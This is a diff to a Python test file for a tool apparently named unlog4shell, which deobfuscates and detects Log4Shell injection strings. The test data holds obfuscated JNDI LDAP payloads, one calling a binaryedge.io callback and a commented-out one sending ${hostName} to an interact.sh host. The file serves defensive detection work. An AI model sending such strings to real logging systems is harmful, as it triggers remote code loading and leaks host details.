@@ -1,6 +1,21 @@
 import pytest
 
-from unlog4shell import check_string
+from unlog4shell import check_string, deobfuscate
+
+
+@pytest.mark.parametrize(
+    "encoded, decoded",
+    [
+        ('${::-x}', 'x'),
+        ('${abc:def:-x}', 'x'),
+        ('${abcd:e:fghi:-x}', 'x'),  # Don't think this is valid, but I've seen examples
+        ('${lower:XYZ}', 'xyz'),
+        # ('foo${::-b}ar', 'foobar'),  # We can't handle anything outside a substition
+        ('${::-${lower:x}}', 'x'),
+    ]
+)
+def test_deobfuscate(encoded, decoded):
+    assert deobfuscate(encoded) == decoded
 
 
 @pytest.mark.parametrize(
@@ -8,6 +23,11 @@ from unlog4shell import check_string
     [
         ('${jNdi:${lower:L}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}',
          '${jndi:ldap://world80.log4j.binaryedge.io:80/callback}'),
+        # This one doesn't preserve ${hostname} so there's room for improvement
+        #('${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6srgca885rp3faud8egcgh5u8oyyti3q.interact.sh}',
+        # '${jndi:ldap://${hostname}.c6srgca885rp3faud8egcgh5u8oyyti3q.interact.sh}'),  # TODO: should we preserve case in ${hostName}?
+        ('${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}',
+         '${jndi:ldap://example.com}'),
     ]
 )
 def test_strings(encoded, decoded):
